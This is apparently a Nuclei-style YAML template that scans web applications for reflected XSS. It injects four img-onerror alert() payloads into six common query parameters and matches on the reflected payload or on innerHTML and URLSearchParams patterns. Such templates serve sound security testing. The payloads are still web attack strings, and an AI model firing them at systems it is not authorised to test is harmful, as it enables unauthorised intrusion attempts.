id: img-onerror-xss

info:
  name: IMG Tag onerror XSS Detection
  author: custom
  severity: high
  description: Detects XSS vulnerability using img tag with onerror event handler
  tags: xss,img,onerror,custom

variables:
  random: "{{1}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}?q={{xss}}"
      - "{{BaseURL}}?search={{xss}}"
      - "{{BaseURL}}?param={{xss}}"
      - "{{BaseURL}}?query={{xss}}"
      - "{{BaseURL}}?keyword={{xss}}"
      - "{{BaseURL}}?input={{xss}}"

    payloads:
      xss:
        - '<img src="x" onerror="alert({{random}})">'
        - '<img src=x onerror=alert({{random}})>'
        - '"><img src="x" onerror="alert({{random}})">'
        - "'><img src=\"x\" onerror=\"alert({{random}})\">"

    stop-at-first-match: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: reflected-xss
        dsl:
          - 'contains(body, "<img src=\"x\" onerror=\"alert(")'
          - 'contains(body, "<img src=x onerror=alert(")'
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
        condition: and

      - type: dsl
        name: dom-xss-vulnerable-pattern
        dsl:
          - 'contains(body, ".innerHTML")'
          - 'contains(body, "URLSearchParams")'
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
        condition: and
